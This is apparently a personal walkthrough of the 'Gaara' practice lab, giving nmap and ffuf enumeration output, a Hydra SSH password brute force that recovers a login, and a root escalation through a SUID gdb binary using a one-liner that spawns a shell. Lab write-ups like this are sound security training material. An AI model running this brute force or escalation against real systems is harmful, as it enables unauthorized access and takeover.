

### Lab Details 

- Difficulty: Easy
- Type: Web, Linux Priv Esc

#### Enumeration
- run `nmap`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gaara
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- enumerate port 80,  found a file named `Cryoserver`
```
$ ffuf -u http://192.168.51.142/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.51.142/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons  [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 2ms]
                        [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 2ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 2ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
#                       [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
# on atleast 2 different hosts [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
#                       [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
#                       [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 3ms]
# Copyright 2007 James Fisher [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 4ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 6ms]
#                       [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 15ms]
                        [Status: 200, Size: 137, Words: 40, Lines: 6, Duration: 1ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms]
Cryoserver              [Status: 200, Size: 327, Words: 1, Lines: 303, Duration: 2ms]
:: Progress: [220560/220560] :: Job [1/1] :: 22222 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```
- Visit the file found three files at the very bottom of the page
![[Pasted image 20260329161023.png]]
- in `iamGaara` file contains a hash string
![[Pasted image 20260329162608.png]]
- using `Cyberchef` found its plaintext
![[Pasted image 20260329162927.png]]

```
gaara:ismyname
```
- however unable to login to target via `ssh`
#### Initial Foothold 
- attempt to bruteforce the password with username `gaara`
```
$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.51.142 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-29 08:34:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.51.142:22/
[22][ssh] host: 192.168.51.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-29 08:35:15
```
- obtained the actual password 
#### Lateral Movement (If any)

#### Privilege Escalation
 - login to target via `ssh`
 - load and run `linpeas`
```
<SNIP>
???????????? SGID
? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid           
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd                                           
-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb
<SNIP>
```
- found the `gdb` has vulnerable capability set
- search on `gtfo.bin` found command to privilege escalation
```
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
```
#### Resources

#### Lesson Learned
